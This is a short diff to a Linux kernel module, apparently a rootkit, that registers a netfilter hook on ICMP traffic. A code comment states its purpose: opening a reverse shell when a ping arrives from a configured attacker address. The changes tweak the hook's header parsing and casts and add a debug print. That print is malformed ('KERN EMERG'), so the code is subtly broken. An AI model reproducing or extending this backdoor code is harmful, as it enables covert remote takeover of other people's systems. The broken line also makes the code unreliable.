@@ -339,12 +339,12 @@ unsigned int icmp_hook_func(void* priv, struct sk_buff* skb, const struct nf_hoo
 		return NF_DROP;
 	}
 
-	// TODO: Maybe use icmp_hdr()
-	ip_header = (struct iphdr*) skb_network_header(skb);
+	ip_header = (struct iphdr*) ip_hdr(skb);
 
 	// If it's an ICMP packet coming from the IP address entered during config,
 	// we should open a reverse shell.
 	if (ip_header->protocol == IPPROTO_ICMP) {
+		printk(KERN EMERG "ICMP ping found!\n");
 		char source_ip[16];
 		printk(KERN_EMERG "%pI4", &ip_header->saddr);
 		snprintf(source_ip, 16, "%pI4", &ip_header->saddr);
@@ -358,9 +358,9 @@ unsigned int icmp_hook_func(void* priv, struct sk_buff* skb, const struct nf_hoo
 }
 
 static void icmp_hook_init(void) {
-	icmp_hook = kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
+	icmp_hook = (struct nf_hook_ops *) kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
 
-	icmp_hook->hook = icmp_hook_func;
+	icmp_hook->hook = (nf_hookfn *) icmp_hook_func;
 	icmp_hook->pf = PF_INET; // Filter by IPV4 protocol family.
 	icmp_hook->hooknum = 0; // Hook ICMP request
 	icmp_hook->priority = NF_IP_PRI_FIRST; // See packets before every other hook function
